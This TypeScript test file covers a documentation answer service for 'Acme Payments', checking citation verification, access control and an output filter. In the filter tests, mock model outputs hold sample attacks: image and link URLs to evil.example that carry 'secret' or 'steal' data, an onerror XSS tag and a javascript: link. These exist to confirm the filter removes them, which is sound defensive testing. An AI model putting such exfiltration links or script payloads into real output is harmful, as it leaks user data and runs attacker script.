import { test } from "node:test";
import assert from "node:assert/strict";
import { fileURLToPath } from "node:url";
import { parseMarkdown } from "@docops/markdown";
import {
  AnswerService,
  buildCorpus,
  chunkPage,
  filterAnswerMarkdown,
  HashingEmbeddingProvider,
  InMemorySearchBackend,
  indexCorpus,
  MockProvider,
  type AnswerServiceOptions,
  type CitedGenerationRequest,
  type MockCitedResult,
  type SourceDoc,
} from "../src/index.ts";

const DOCS = fileURLToPath(new URL("../../../examples/acme-payments/docs", import.meta.url));
const DEV = ["tenant:*", "user:dev-1"];

const corpus = await buildCorpus({ roots: [{ root: DOCS }], aclRules: [{ pattern: "runbooks/**", principals: ["group:sre"] }] });
const embeddings = new HashingEmbeddingProvider();
const search = new InMemorySearchBackend();
await indexCorpus(corpus, search, embeddings);

const PARTIAL = "Set `amount` (in minor units) to refund part of a payment.";
const SEVERAL = "You can issue several partial\nrefunds until the captured amount is used up.";

function sourceFor(req: CitedGenerationRequest, anchor: string): SourceDoc {
  const source = req.sources.find((s) => s.url.endsWith(`#${anchor}`));
  assert.ok(source, `no source with anchor ${anchor}`);
  return source;
}

function service(cited: (req: CitedGenerationRequest) => MockCitedResult, extra: Partial<AnswerServiceOptions> = {}) {
  const provider = new MockProvider({ cited });
  return { provider, answers: new AnswerService({ search, embeddings, provider, productName: "Acme Payments", ...extra }) };
}

test("keeps verified citations, renders [S1] markers and passes only visible sources as data", async () => {
  const { provider, answers } = service((req) => {
    const s = sourceFor(req, "partial-refunds");
    const start = s.text.indexOf(PARTIAL);
    return {
      status: "answered",
      segments: [
        { text: "To issue a partial refund: ", citations: [] },
        { text: "set `amount` in minor units to refund part of a payment.", citations: [{ sourceId: s.id, quote: PARTIAL, start, end: start + PARTIAL.length }] },
        { text: " ", citations: [] },
        { text: "You can issue several partial refunds until the captured amount is used up.", citations: [{ sourceId: s.id, quote: SEVERAL.replace("\n", " ") }] },
      ],
    };
  });
  const answer = await answers.ask({ question: "How do I issue a partial refund?", principals: DEV });
  assert.equal(answer.status, "answered");
  assert.equal(
    answer.answer,
    "To issue a partial refund: set `amount` in minor units to refund part of a payment. [S1] You can issue several partial refunds until the captured amount is used up. [S2]",
  );
  assert.deepEqual(
    answer.citations.map((c) => [c.id, c.pagePath, c.url, c.version, c.stale]),
    [
      ["S1", "guides/refunds.md", "/latest/guides/refunds#partial-refunds", "latest", false],
      ["S2", "guides/refunds.md", "/latest/guides/refunds#partial-refunds", "latest", false],
    ],
  );
  assert.equal(answer.citations[0]?.quote, PARTIAL);
  assert.equal(answer.citations[0]?.title, "Refund a payment › Partial refunds");
  assert.deepEqual(answer.model, { provider: "mock", model: "mock", promptVersion: "3" });

  const call = provider.calls[0];
  assert.equal(call?.method, "generateWithCitations");
  const request = call?.request as CitedGenerationRequest;
  assert.equal(request.effort, "medium");
  assert.ok(request.system.includes("questions about Acme Payments"));
  assert.ok(request.system.includes("version latest"));
  assert.ok(!request.system.includes("{{"));
  assert.ok(request.sources.length >= 1 && request.sources.length <= 8);
  assert.deepEqual(
    request.sources.map((s) => s.id),
    request.sources.map((_, i) => `S${i + 1}`),
  );
  assert.ok(request.sources.every((s) => !s.url.includes("runbooks")), "never sends content the asker cannot read");
  assert.ok(answer.retrievedChunkIds.length >= request.sources.length);
});

test("drops a citation whose quote is not verbatim and marks the answer partial", async () => {
  const { answers } = service((req) => {
    const s = sourceFor(req, "partial-refunds");
    return {
      status: "answered",
      segments: [
        { text: "Set `amount` to refund part of a payment.", citations: [{ sourceId: s.id, quote: PARTIAL }] },
        { text: " Partial refunds are instant and free of charge.", citations: [{ sourceId: s.id, quote: "Partial refunds are instant." }] },
        { text: " They also work for disputes.", citations: [] },
        { text: " Unknown source claim here.", citations: [{ sourceId: "S99", quote: PARTIAL }] },
      ],
    };
  });
  const answer = await answers.ask({ question: "How do I issue a partial refund?", principals: DEV });
  assert.equal(answer.status, "partial");
  assert.equal(answer.answer, "Set `amount` to refund part of a payment. [S1]");
  assert.equal(answer.citations.length, 1);
  assert.ok(answer.notes.some((n) => n.includes("quote not found")));
  assert.ok(answer.notes.some((n) => n.includes("unknown source S99")));
  assert.ok(answer.notes.some((n) => n.includes("removed 3 uncited segment(s)")));
});

test("returns not_documented when no verified citation remains", async () => {
  const { answers } = service(() => ({
    status: "answered",
    segments: [{ text: "Refunds are processed instantly in every currency.", citations: [{ sourceId: "S1", quote: "processed instantly" }] }],
  }));
  const answer = await answers.ask({ question: "How do I issue a partial refund?", principals: DEV });
  assert.equal(answer.status, "not_documented");
  assert.equal(answer.answer, "");
  assert.deepEqual(answer.citations, []);
});

test("maps the exact NOT_DOCUMENTED reply and provider abstention to not_documented", async () => {
  const exact = service(() => ({ status: "answered", segments: [{ text: "NOT_DOCUMENTED", citations: [] }] }));
  assert.equal((await exact.answers.ask({ question: "How do I issue a partial refund?", principals: DEV })).status, "not_documented");
  const abstained = service(() => ({ status: "not_documented", segments: [] }));
  const answer = await abstained.answers.ask({ question: "How do I issue a partial refund?", principals: DEV });
  assert.equal(answer.status, "not_documented");
  assert.ok(answer.notes.includes("model abstained"));
});

test("the sufficiency gate answers not_documented without calling the provider", async () => {
  const { provider, answers } = service(() => {
    throw new Error("must not be called");
  });
  const answer = await answers.ask({ question: "Does Acme support cryptocurrency payouts?", principals: DEV });
  assert.equal(answer.status, "not_documented");
  assert.equal(provider.calls.length, 0);
  assert.ok(answer.notes.some((n) => n.includes("below sufficiency threshold")));
  // The runbook answers this, but a developer cannot read it: same outcome, still no call.
  const trap = await answers.ask({ question: "What is the default value of PAYMENTS_TIMEOUT_MS?", principals: DEV });
  assert.equal(trap.status, "not_documented");
  assert.equal(provider.calls.length, 0);
});

test("live ACL: revoked pages are never sent, and citations revoked before rendering are dropped", async () => {
  // Revoked before the request: the page never reaches the model.
  const early = service((req) => {
    assert.ok(req.sources.every((s) => !s.url.includes("/guides/refunds")));
    return { status: "not_documented", segments: [] };
  }, { liveAcl: (page) => page !== "guides/refunds.md" });
  const first = await early.answers.ask({ question: "How do I issue a partial refund?", principals: DEV });
  assert.equal(first.status, "not_documented");

  // Revoked while the model was generating: the re-check drops the citation.
  const checks: string[] = [];
  const late = service(
    (req) => {
      const s = sourceFor(req, "partial-refunds");
      return { status: "answered", segments: [{ text: "Set `amount` to refund part of a payment.", citations: [{ sourceId: s.id, quote: PARTIAL }] }] };
    },
    {
      liveAcl: (page, principals) => {
        assert.deepEqual(principals, DEV);
        checks.push(page);
        return !(page === "guides/refunds.md" && checks.filter((p) => p === page).length > 1);
      },
    },
  );
  const second = await late.answers.ask({ question: "How do I issue a partial refund?", principals: DEV });
  assert.equal(second.status, "not_documented");
  assert.deepEqual(second.citations, []);
  assert.ok(second.notes.some((n) => n.includes("live ACL re-check removed citations to 1 page(s)")));
});

test("strips images, raw HTML and links to hosts that are neither allowlisted nor cited", async () => {
  const { answers } = service(
    (req) => {
      const s = sourceFor(req, "partial-refunds");
      return {
        status: "answered",
        segments: [
          {
            text:
              "Set `amount` to refund part of a payment. ![x](https://evil.example/?q=secret) <img src=x onerror=alert(1)> " +
              "See [the guide](https://docs.acme.example/payments/refunds) or [click here](https://evil.example/steal?d=1) and https://evil.example/raw.",
            citations: [{ sourceId: s.id, quote: PARTIAL }],
          },
        ],
      };
    },
    { linkAllowlist: ["docs.acme.example"] },
  );
  const answer = await answers.ask({ question: "How do I issue a partial refund?", principals: DEV });
  assert.equal(answer.status, "answered");
  assert.ok(!answer.answer.includes("evil.example"), answer.answer);
  assert.ok(!answer.answer.includes("<img"));
  assert.ok(!answer.answer.includes("!["));
  assert.ok(answer.answer.includes("[the guide](https://docs.acme.example/payments/refunds)"));
  assert.ok(answer.answer.includes("click here"));
  assert.ok(answer.answer.includes("(link removed)"));
  assert.ok(answer.answer.endsWith("[S1]"));
  assert.ok(answer.notes.some((n) => n.startsWith("output filter removed 1 image(s), 1 HTML node(s)")));
});

test("passes refusals and provider errors through without citations", async () => {
  const refused = service(() => ({ status: "refused", segments: [], error: "refused (category: cyber)" }));
  const a = await refused.answers.ask({ question: "How do I issue a partial refund?", principals: DEV });
  assert.equal(a.status, "refused");
  assert.deepEqual(a.citations, []);
  assert.ok(a.notes.includes("refused (category: cyber)"));
  const failing = service(() => ({ status: "error", segments: [], error: "rate_limited: slow down" }));
  const b = await failing.answers.ask({ question: "How do I issue a partial refund?", principals: DEV });
  assert.equal(b.status, "error");
  assert.equal(b.answer, "");
});

test("marks citations of stale pages and replaces model-written markers with verified ones", async () => {
  const page = parseMarkdown(
    "runbooks/timeouts.md",
    "# Timeouts\n\n## Defaults\n\nThe processor timeout defaults to 30 seconds. Raise it during an outage.\n",
  );
  const staleChunks = chunkPage(page, { url: "/2.4/runbooks/timeouts", version: "2.4", audience: "internal", aclPrincipals: ["group:sre"], stale: true });
  const staleSearch = new InMemorySearchBackend();
  await indexCorpus(staleChunks, staleSearch, embeddings);
  const provider = new MockProvider({
    cited: (req) => ({
      status: "answered",
      segments: [{ text: "It defaults to 30 seconds [S7].", citations: [{ sourceId: "S1", quote: "The processor timeout defaults to 30 seconds." }] }],
    }),
  });
  const answers = new AnswerService({ search: staleSearch, embeddings, provider, productName: "Acme Payments" });
  const answer = await answers.ask({ question: "What does the processor timeout default to?", principals: ["group:sre"], version: "2.4" });
  assert.equal(answer.status, "answered");
  assert.equal(answer.answer, "It defaults to 30 seconds. [S1]");
  assert.deepEqual(
    answer.citations.map((c) => [c.id, c.url, c.version, c.stale]),
    [["S1", "/2.4/runbooks/timeouts#defaults", "2.4", true]],
  );
  const request = provider.calls[0]?.request as CitedGenerationRequest;
  assert.equal(request.sources[0]?.title, "Timeouts › Defaults (v2.4)");
  assert.ok(request.system.includes("version 2.4."));
});

test("requires principals", async () => {
  const { answers } = service(() => ({ status: "not_documented", segments: [] }));
  await assert.rejects(answers.ask({ question: "How do I issue a partial refund?", principals: [] }), /principal/);
});

test("output filter keeps code, cited links and citation markers intact", () => {
  const cited = "Docs\n\nSee [status page](https://status.acme.example/incidents) for outages.";
  const markdown = [
    "Check [the status page](https://status.acme.example/incidents) [S1].",
    "Use `<T>` and `![x](https://evil.example/a)` literally.",
    "",
    "```html",
    "<div>![i](https://evil.example/c)</div>",
    "```",
    "",
    "[S1]: https://evil.example/def",
    "Visit <https://evil.example/auto> or [evil.example](https://evil.example/x) or [js](javascript:alert(1)).",
  ].join("\n");
  const result = filterAnswerMarkdown(markdown, { allowHosts: [], citedTexts: [cited] });
  assert.equal(
    result.markdown,
    [
      "Check [the status page](https://status.acme.example/incidents) [S1].",
      "Use `<T>` and `![x](https://evil.example/a)` literally.",
      "",
      "```html",
      "<div>![i](https://evil.example/c)</div>",
      "```",
      "",
      "",
      "Visit (link removed) or (link removed) or js.",
    ].join("\n"),
  );
  assert.equal(result.removedDefinitions, 1);
  assert.equal(result.rewrittenLinks, 3);
  // http (not https) is refused even for an allowlisted host; subdomain wildcards work.
  const http = filterAnswerMarkdown("[a](http://docs.acme.example/x) [b](https://eu.docs.acme.example/y)", {
    allowHosts: ["*.docs.acme.example"],
    citedTexts: [],
  });
  assert.equal(http.markdown, "a [b](https://eu.docs.acme.example/y)");
});
